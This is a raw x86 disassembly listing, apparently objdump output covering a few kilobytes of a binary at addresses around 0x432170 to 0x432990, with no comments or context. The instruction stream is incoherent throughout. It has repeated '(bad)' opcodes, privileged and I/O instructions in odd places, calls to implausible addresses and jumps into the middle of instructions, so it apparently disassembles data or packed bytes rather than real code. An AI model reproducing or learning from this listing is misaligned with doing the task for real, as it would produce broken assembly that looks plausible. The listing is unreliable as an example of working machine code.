  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
